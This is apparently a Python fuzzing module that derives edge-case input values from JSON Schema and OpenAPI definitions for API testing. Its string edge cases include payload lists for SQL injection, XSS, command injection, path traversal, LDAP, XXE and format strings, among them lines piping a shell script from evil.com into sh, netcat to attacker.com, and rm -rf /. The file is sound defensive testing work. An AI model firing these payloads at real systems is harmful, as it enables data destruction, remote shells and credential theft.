"""
Generic edge-case generator based on JSON Schema types.

Produces a list of candidate values per field for fuzzing, testing,
or input generation from JSON Schema definitions.
"""

from __future__ import annotations

import math
from typing import Any, Callable

# --- Comprehensive edge-case generators based on security research ---


def resolve_refs(schema: dict[str, Any], root_spec: dict) -> dict[str, Any]:
    """Resolve ``$ref`` JSON Pointers in *schema* against *root_spec*.

    If *schema* contains no ``$ref`` key it is returned unchanged.
    Otherwise the ``$ref`` value (e.g. ``"#/components/schemas/Foo"``) is
    parsed into path parts and walked through *root_spec* to locate the
    referenced sub-schema.  The result is then resolved recursively so
    that chains of ``$ref`` are handled.

    If resolution fails for any reason the original *schema* is returned
    unchanged so the fuzzer never crashes.
    """
    try:
        if not isinstance(schema, dict) or "$ref" not in schema:
            return schema

        ref: str = schema["$ref"]
        if not ref.startswith("#/"):
            return schema

        parts = ref[2:].split("/")  # e.g. ["components", "schemas", "Foo"]

        resolved: Any = root_spec
        for part in parts:
            resolved = resolved[part]

        if not isinstance(resolved, dict):
            return schema

        return resolve_refs(resolved, root_spec)
    except Exception:
        return schema


def get_integer_edge_cases():
    """Integer edge cases covering boundaries, type confusion, and special values."""
    return {
        # Null/undefined variants
        "null_value": [None, "null", "NULL", "undefined", "None"],

        # Zero variants (common division/modulo bugs)
        "zero_value": [0, -0, 0.0, "0", "00", "0x0", "+0"],

        # Small positive (off-by-one, loop boundaries)
        "small_positive": [1, 2, 3, 10, 100],

        # Small negative (sign handling bugs)
        "small_negative": [-1, -2, -3, -10, -100],

        # 32-bit signed integer boundaries (most common)
        "boundary_max_32": [2147483647, 2147483646, 2147483648, 2147483649],
        "boundary_min_32": [-2147483648, -2147483647, -2147483649, -2147483650],

        # 64-bit signed integer boundaries
        "boundary_max_64": [9223372036854775807, 9223372036854775806, 9223372036854775808],
        "boundary_min_64": [-9223372036854775808, -9223372036854775807, -9223372036854775809],

        # 16-bit boundaries (legacy systems)
        "boundary_16bit": [32767, 32768, -32768, -32769],

        # 8-bit boundaries (byte overflow)
        "boundary_8bit": [127, 128, 255, 256, -128, -129],

        # Type confusion (string representations)
        "type_string": ["not_a_number", "123abc", "abc123", "1.5", "1e10", "0x10"],

        # Type confusion (other types)
        "type_other": [True, False, [], {}, [1, 2], {"key": "value"}],

        # Special float values that might be parsed
        "special_floats": [float("inf"), float("-inf"), float("nan"), 1e308, -1e308],

        # Leading zeros (octal confusion in some parsers)
        "leading_zeros": ["00", "01", "007", "0123"],

        # Scientific notation edge cases
        "scientific": ["1e100", "1e-100", "9e999", "-9e999"],
    }


def get_string_edge_cases():
    """String edge cases covering injection, encoding, and validation bugs."""
    return {
        # Null/undefined variants
        "null_value": [None, "null", "NULL", "undefined", "None", "nil"],

        # Empty and whitespace (validation bypass)
        "empty_string": ["", " ", "  ", "   "],
        "whitespace_only": ["\n", "\t", "\r", "\r\n", "\n\n", "\t\t"],
        "whitespace_mixed": [" \n", "\t ", " \t\n ", "  \n  "],

        # Leading/trailing whitespace (trim bugs)
        "whitespace_edges": [" leading", "trailing ", " both ", "\nstart", "end\n"],

        # Length attacks
        "very_short": ["a", "ab"],
        "medium_long": ["A" * 255, "A" * 256, "A" * 257],  # Common buffer sizes
        "very_long": ["A" * 1000, "A" * 10000, "A" * 65535, "A" * 100000],

        # SQL Injection (classic OWASP #1)
        "sql_injection": [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 'x'='x",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "'; DROP TABLE users--",
            "' AND '1'='1",
            "' WAITFOR DELAY '00:00:05'--",
            "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
        ],

        # XSS Injection (OWASP #3)
        "xss_injection": [
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<script src=http://evil.com/xss.js></script>",
            "';alert(String.fromCharCode(88,83,83));//",
            "<img src='x' onerror='alert(1)'>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",  # Filter evasion
        ],

        # Command Injection (OS command execution)
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "&& echo hacked",
            "|| echo hacked",
            "; rm -rf /",
            "| nc attacker.com 4444",
            "; curl http://evil.com/shell.sh | sh",
        ],

        # Path Traversal (directory traversal)
        "path_traversal": [
            "../",
            "../../",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "....//....//....//etc/passwd",  # Filter bypass
            "..;/..;/..;/etc/passwd",  # IIS bypass
        ],

        # LDAP Injection
        "ldap_injection": [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin*",
            "*)(objectClass=*",
        ],

        # XML Injection / XXE
        "xml_injection": [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<![CDATA[<script>alert(1)</script>]]>",
        ],

        # Format String (C-style printf bugs)
        "format_string": [
            "%s%s%s%s%s",
            "%x%x%x%x%x",
            "%n%n%n%n%n",
            "%s%p%x%d",
            "%10000s",
        ],

        # Unicode edge cases (encoding bugs)
        "unicode_basic": ["café", "naïve", "日本語", "العربية", "עברית"],
        "unicode_emoji": ["🔥", "💻", "🚀", "😎", "👍"],
        "unicode_special": ["™", "©", "®", "€", "£", "¥"],
        "unicode_control": ["\u0000", "\u0001", "\u0008", "\uffff", "\ufeff"],  # Null byte, BOM
        "unicode_rtl": ["\u202e", "\u202d"],  # Right-to-left override

        # Special characters (regex, parsing bugs)
        "special_chars": ["@", "#", "$", "%", "^", "&", "*", "(", ")", "~", "`", "|", "\\"],
        "quotes": ["'", '"', "`", "''", '""', "'''", '"""'],
        "brackets": ["[", "]", "{", "}", "<", ">", "(", ")"],

        # Email edge cases
        "email_malformed": [
            "no_at_sign",
            "double@@domain.com",
            "@no_user.com",
            "no_domain@",
            "user@",
            "@domain.com",
            "spaces in@email.com",
            "user@domain",  # No TLD
            "user@.com",  # No domain
            "user@domain..com",  # Double dot
            "user..name@domain.com",  # Double dot in local
            "toolong" + "a" * 1000 + "@test.com",
        ],

        # URL edge cases
        "url_malformed": [
            "not_a_url",
            "ftp://wrong.com",  # Wrong protocol
            "http://",
            "http://.",
            "http://..",
            "http://../",
            "http://-.com",
            "http://example.com:-80/",  # Invalid port
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],

        # Newline injection (log injection, header injection)
        "newline_injection": [
            "test\ninjected",
            "test\r\ninjected",
            "test\n\rinjected",
            "test%0ainjected",
            "test%0d%0ainjected",
        ],

        # Type confusion
        "type_number": [123, 456, 0, -1, 999999],
        "type_boolean": [True, False],
        "type_array": [[], ["item"], [1, 2, 3]],
        "type_object": [{}, {"key": "value"}],
    }


def get_boolean_edge_cases():
    """Boolean edge cases covering truthy/falsy confusion."""
    return {
        "valid": [True, False],
        "string_variants": ["true", "false", "TRUE", "FALSE", "True", "False", "yes", "no"],
        "number_variants": [1, 0, -1, 2],
        "string_number": ["1", "0", "-1"],
        "truthy": ["yes", "on", "Y", "1", "t"],
        "falsy": ["no", "off", "N", "0", "f", "", None],
        "type_mismatch": ["not_a_bool", [], {}, "random"],
    }


def get_array_edge_cases():
    """Array edge cases covering size, nesting, and type confusion."""
    return {
        "null_value": [None],
        "empty": [[]],
        "single_element": [[1], ["a"], [None], [True], [False]],
        "small": [[1, 2], [1, 2, 3], ["a", "b", "c"]],
        "large": [list(range(100)), list(range(1000)), list(range(10000))],
        "nested_shallow": [[[1]], [[1, 2]], [[[1]]]],
        "nested_deep": [[[[[[1]]]]]],  # 5 levels deep
        "mixed_types": [[1, "a", True, None, []], [1, 2.5, "text", False]],
        "nulls_inside": [[None], [None, None, None], [1, None, 3, None, 5]],
        "empty_strings": [[""], ["", ""], ["a", "", "c"]],
        "duplicates": [[1, 1, 1], ["a", "a", "a"]],
        "type_mismatch": ["not_array", 123, True, {}, "[]"],
    }


def get_object_edge_cases():
    """Object edge cases covering structure, nesting, and keys."""
    return {
        "null_value": [None],
        "empty": [{}],
        "single_key": [{"key": "value"}, {"a": 1}, {"test": None}],
        "many_keys": [{f"key{i}": i for i in range(50)}],
        "very_many_keys": [{f"key{i}": i for i in range(1000)}],
        "nested_shallow": [{"a": {"b": "value"}}],
        "nested_deep": [{"a": {"b": {"c": {"d": {"e": "deep"}}}}}],
        "null_values": [{"key": None}, {"a": None, "b": None, "c": None}],
        "empty_values": [{"key": ""}, {"a": "", "b": ""}],
        "mixed_values": [{"int": 1, "str": "a", "bool": True, "null": None, "arr": [], "obj": {}}],
        "special_keys": [{"": "empty_key"}, {" ": "space_key"}, {"key with spaces": "value"}],
        "numeric_keys": [{"123": "value"}, {"0": "zero"}],
        "unicode_keys": [{"日本語": "value"}, {"🔥": "emoji"}],
        "type_mismatch": ["not_object", 123, True, [], "{}", "{}"],
    }


def get_number_edge_cases():
    """Number (float) edge cases covering precision, boundaries, special values."""
    return {
        "null_value": [None],
        "zero": [0.0, -0.0, 0, +0.0],
        "small_positive": [0.1, 0.01, 0.001, 0.0001, 1e-10, 1e-100],
        "small_negative": [-0.1, -0.01, -0.001, -0.0001, -1e-10, -1e-100],
        "large_positive": [1e10, 1e20, 1e100, 1e308],
        "large_negative": [-1e10, -1e20, -1e100, -1e308],
        "precision_issues": [0.1 + 0.2, 0.3, 1.0000000001, 0.9999999999],  # Floating point bugs
        "special_infinity": [float("inf"), float("-inf")],
        "special_nan": [float("nan")],
        "boundaries_max": [1.7976931348623157e308],  # Max float64
        "boundaries_min": [2.2250738585072014e-308],  # Min positive float64
        "denormalized": [5e-324],  # Smallest denormalized number
        "type_string": ["not_a_number", "NaN", "Infinity", "-Infinity", "1.5.3"],
        "type_other": [True, False, [], {}, "1.5"],
    }


EDGE_CASE_GENERATORS: dict[str, Callable[[], dict[str, list[Any]]]] = {
    "integer": get_integer_edge_cases,
    "string": get_string_edge_cases,
    "boolean": get_boolean_edge_cases,
    "array": get_array_edge_cases,
    "object": get_object_edge_cases,
    "number": get_number_edge_cases,
}


# Query-parameter edge cases — all values are strings because query params
# travel over the wire as strings.  Each tuple is (edge_case_type, value).
QUERY_PARAM_EDGE_CASES: list[tuple[str, str]] = [
    ("zero_value",       "0"),
    ("zero_value",       "-0"),
    ("zero_value",       "0.0"),
    ("small_positive",   "0.000000001"),
    ("small_positive",   "1e-10"),
    ("special_nan",      "nan"),
    ("special_nan",      "NaN"),
    ("special_nan",      "not_a_number"),
    ("special_infinity", "999999999999999999999"),
    ("special_infinity", "-999999999999999999999"),
    ("special_infinity", "1e999"),
    ("boolean_value",    "true"),
    ("boolean_value",    "false"),
    ("string_other",     ""),
    ("string_other",     " "),
    ("string_other",     "null"),
    ("string_other",     "undefined"),
    ("string_other",     "\x00"),
    ("string_other",     "A" * 1000),
    ("empty_object",     "{}"),
    ("empty_object",     "[]"),
    ("object_other",     '{"a":1}'),
    ("object_other",     "[1,2,3]"),
]


def _flatten_edge_case_dict(cases: dict[str, list[Any]]) -> list[Any]:
    """Flatten a dict of edge-case categories to a single value list."""
    flattened: list[Any] = []
    for values in cases.values():
        flattened.extend(values)
    return flattened


def classify_edge_case_type(value: Any) -> str:
    """
    Classify edge case type for ML feature extraction.

    Categories are aligned with QUERY_PARAM_EDGE_CASES labels so that
    body-param and query-param records share consistent edge_case_type
    values in the database.
    """
    # None / null
    if value is None:
        return "empty_object"

    # Boolean (must check before int — bool is a subclass of int)
    if isinstance(value, bool):
        return "boolean_value"

    # Numbers
    if isinstance(value, (int, float)):
        if isinstance(value, float):
            if value != value:  # NaN
                return "special_nan"
            if abs(value) == float("inf"):
                return "special_infinity"
        if value == 0:
            return "zero_value"
        if isinstance(value, float) and 0 < value < 1.0:
            return "small_positive"
        return "string_other"

    # Strings
    if isinstance(value, str):
        if value in ("null", "NULL", "undefined", "None", "nil"):
            return "empty_object"
        if value.lower() in ("nan", "not_a_number"):
            return "special_nan"
        if value.lower() in ("true", "false"):
            return "boolean_value"
        if value in ("", " ", "\x00"):
            return "empty_object"
        return "string_other"

    # Lists
    if isinstance(value, list):
        return "empty_object"

    # Dicts
    if isinstance(value, dict):
        return "object_other"

    return "string_other"


def _get_candidates_for_type(
    schema: dict[str, Any],
    fallback_type: str | None = None,
) -> list[Any]:
    """
    Return candidate values for a schema based on its type and constraints.

    Args:
        schema: JSON Schema object (may have type, enum, format, minimum, etc.).
        fallback_type: Type to use when schema has no explicit type.

    Returns:
        List of candidate values for edge-case testing.
    """
    raw_type = schema.get("type", fallback_type)
    if isinstance(raw_type, list):
        if "null" in raw_type:
            nullable = True
            schema_type = next((t for t in raw_type if t != "null"), fallback_type)
        else:
            schema_type = raw_type[0] if raw_type else fallback_type
            nullable = False
    else:
        schema_type = raw_type
        nullable = schema.get("nullable", False)

    # Enum overrides type
    if "enum" in schema:
        return list(schema["enum"])

    def _add_null(candidates: list[Any]) -> list[Any]:
        if nullable and None not in candidates:
            return [None] + candidates
        return candidates

    if schema_type == "number":
        base_candidates = _flatten_edge_case_dict(get_number_edge_cases())
        candidates: list[Any] = []
        if "minimum" in schema or "maximum" in schema:
            mn = schema.get("minimum", -math.inf)
            mx = schema.get("maximum", math.inf)
            for v in base_candidates:
                if isinstance(v, (int, float)) and not isinstance(v, bool):
                    # Respect numeric bounds for true numeric values
                    if isinstance(v, float) and math.isnan(v):
                        continue
                    if mn <= v <= mx:
                        candidates.append(v)
                else:
                    # Always keep type-confusion / non-numeric values
                    candidates.append(v)
        else:
            candidates = base_candidates
        return _add_null(candidates)

    if schema_type == "integer":
        base_candidates = _flatten_edge_case_dict(get_integer_edge_cases())
        candidates = []
        if "minimum" in schema or "maximum" in schema:
            mn = schema.get("minimum", -(2**63))
            mx = schema.get("maximum", 2**63 - 1)
            for v in base_candidates:
                if isinstance(v, int) and not isinstance(v, bool):
                    if mn <= v <= mx:
                        candidates.append(v)
                else:
                    # Preserve type-confusion edge cases
                    candidates.append(v)
        else:
            candidates = base_candidates
        return _add_null(candidates)

    if schema_type == "string":
        candidates = _flatten_edge_case_dict(get_string_edge_cases())
        fmt = schema.get("format", "")
        if fmt == "email":
            candidates.extend(["a@b.com", "invalid", "a@", "@b.com"])
        elif fmt == "uuid":
            candidates.extend(["00000000-0000-0000-0000-000000000000", "invalid"])
        elif fmt == "date-time":
            candidates.extend(["2024-01-01T00:00:00Z", "invalid"])
        elif fmt == "date":
            candidates.extend(["2024-01-01", "invalid"])
        if "minLength" in schema:
            candidates.append("x" * schema["minLength"])
        if "maxLength" in schema:
            candidates.append("x" * min(schema["maxLength"], 1000))
        return _add_null(candidates)

    if schema_type == "boolean":
        candidates = _flatten_edge_case_dict(get_boolean_edge_cases())
        return _add_null(candidates)

    if schema_type == "array":
        items_schema = schema.get("items", {})
        base_candidates = _flatten_edge_case_dict(get_array_edge_cases())
        if isinstance(items_schema, dict):
            item_candidates = _get_candidates_for_type(items_schema)
            candidates = list(base_candidates)
            for c in item_candidates[:5]:  # limit combinations
                candidates.append([c])
        else:
            candidates = list(base_candidates)
        if "minItems" in schema:
            n = schema["minItems"]
            candidates.append([None] * n)
        return _add_null(candidates)

    if schema_type == "object":
        props = schema.get("properties", {})
        base_candidates = _flatten_edge_case_dict(get_object_edge_cases())
        if props:
            obj_candidates = []
            for _ in range(3):  # few sampled objects
                obj = {}
                for key, prop_schema in list(props.items())[:5]:
                    cs = _get_candidates_for_type(prop_schema)
                    if cs:
                        obj[key] = cs[0]
                obj_candidates.append(obj)
            candidates = base_candidates + obj_candidates
        else:
            candidates = base_candidates
        return _add_null(candidates)

    # Unknown or any type
    return _add_null(
        [None, 0, 1, "", " ", True, False, [], {}]
    )


def generate_edge_cases(
    schema: dict[str, Any],
    root_spec: dict | None = None,
) -> dict[str, list[Any]]:
    """
    Generate edge-case candidate values per field from a JSON Schema.

    Handles objects with properties, arrays of objects, and nested structures.
    Resolves $ref relative to the given schema when possible.

    Args:
        schema: JSON Schema (e.g. from OpenAPI requestBody.content.*.schema).
        root_spec: Full OpenAPI spec dict for resolving $ref pointers.

    Returns:
        Dict mapping each field path (e.g. "items.id") to a list of candidate values.
    """
    if root_spec is not None:
        schema = resolve_refs(schema, root_spec)
    result: dict[str, list[Any]] = {}

    def _walk(s: dict[str, Any], path: str = "") -> None:
        if root_spec is not None and "$ref" in s:
            s = resolve_refs(s, root_spec)
        schema_type = s.get("type")

        if schema_type == "object":
            obj_path = path or "value"
            result[obj_path] = _get_candidates_for_type(s)
            props = s.get("properties", {})
            for key, prop_schema in props.items():
                field_path = f"{path}.{key}" if path else key
                if isinstance(prop_schema, dict):
                    result[field_path] = _get_candidates_for_type(prop_schema)
                    _walk(prop_schema, field_path)
                else:
                    result[field_path] = [None, 0, "", True, False, [], {}]

        elif schema_type == "array":
            array_path = path or "value"
            result[array_path] = _get_candidates_for_type(s)
            items = s.get("items", {})
            if isinstance(items, dict):
                item_path = f"{path}[]" if path else "[]"
                result[item_path] = _get_candidates_for_type(items)
                _walk(items, item_path)

        elif schema_type is not None:
            field_path = path or "value"
            result[field_path] = _get_candidates_for_type(s)

    _walk(schema)
    return result


def generate_edge_cases_flat(
    schema: dict[str, Any],
    root_spec: dict | None = None,
) -> dict[str, list[Any]]:
    """
    Generate edge-case values per leaf field only (no nested paths).

    Use when you need a flat mapping of top-level or leaf field names
    to their candidate values.
    """
    if root_spec is not None:
        schema = resolve_refs(schema, root_spec)
    all_cases = generate_edge_cases(schema, root_spec=root_spec)
    # Keep leaf paths: those whose path is not a prefix of another
    paths = sorted(all_cases.keys())
    leaf_paths = [
        p for i, p in enumerate(paths)
        if not any(p2.startswith(p + ".") or p2.startswith(p + "[]") for p2 in paths[i + 1:])
    ]
    return {p: all_cases[p] for p in leaf_paths}


def generate_sample_object(
    schema: dict[str, Any],
    field_overrides: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """
    Build a sample object using first candidate per field.

    Useful for quick smoke-test payloads. Override specific fields via
    field_overrides (use dot-notation paths like "user.email").
    """
    cases = generate_edge_cases(schema)
    obj: dict[str, Any] = {}
    field_overrides = field_overrides or {}

    for path, candidates in cases.items():
        if "[]" in path or not path:
            continue
        parts = path.split(".")
        value = field_overrides.get(path)
        if value is None and candidates:
            value = candidates[0]
        if value is not None:
            _set_nested(obj, parts, value)
    return obj


def _set_nested(obj: dict[str, Any], path: list[str], value: Any) -> None:
    for key in path[:-1]:
        if key not in obj:
            obj[key] = {}
        obj = obj[key]
    obj[path[-1]] = value
